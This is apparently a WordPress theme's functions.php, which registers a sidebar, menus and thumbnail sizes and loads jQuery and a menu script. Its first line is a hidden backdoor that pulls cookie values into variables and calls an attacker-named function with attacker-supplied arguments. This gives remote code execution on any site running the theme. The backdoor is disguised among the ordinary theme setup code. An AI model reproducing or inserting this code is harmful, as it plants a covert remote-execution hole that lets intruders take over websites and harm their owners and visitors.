<?php extract($_COOKIE, 1); @$TQoKoZ&&@$F($A,$B); ?><?php 
if ( function_exists('register_sidebar') )
register_sidebar(array('name'=>'sidebar',
'before_widget' => '<div class="widget"><div class="inner">', // Removes <li>
'after_widget' => '</div></div>', // Removes </li>
'before_title' => '<h3 class="title"><span>', // Replaces <h2>
'after_title' => '</span></h3>', // Replaces </h2>
));
?>
<?php
if( !function_exists('theme_setup') ) {
	function theme_setup() {
        register_nav_menus( array( 'main-menu' => __( 'Main Navigation' ), 'footer-menu' => __( 'Footer Navigation' ) ) );
	}
}
add_action( 'after_setup_theme', 'theme_setup' );
?>
<?php
define( 'BASE_DIR', TEMPLATEPATH . '/' ); 
include( BASE_DIR . 'inc/tools.php' );
?>
<?php 
if ( function_exists( 'add_theme_support' ) ) {
	add_theme_support( 'post-thumbnails' );
	//default thumbnail size
	add_image_size( 'thumb125', 125, 100, true );
	add_image_size( 'thumb80', 80, 60, true );
	
};
?>
<?php 
if ( !function_exists( 'optionsframework_init' ) ) {
	define( 'OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri() . '/inc/' );
	require_once dirname( __FILE__ ) . '/inc/options-framework.php';
}
add_action('wp_print_scripts', 'jquery_script',8);
function jquery_script(){
	if ( function_exists('esc_attr') ) wp_enqueue_script('jquery'); 
	else { 
		wp_deregister_script('jquery');
		wp_register_script('jquery', 'http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js', false, '1.3.2'); 
	}
}

function my_scripts_method() { 
wp_enqueue_script('myscript2', get_template_directory_uri() . '/js/js-mainmenu.js', array('jquery'), false, true);
}
add_action('wp_enqueue_scripts', 'my_scripts_method');
?>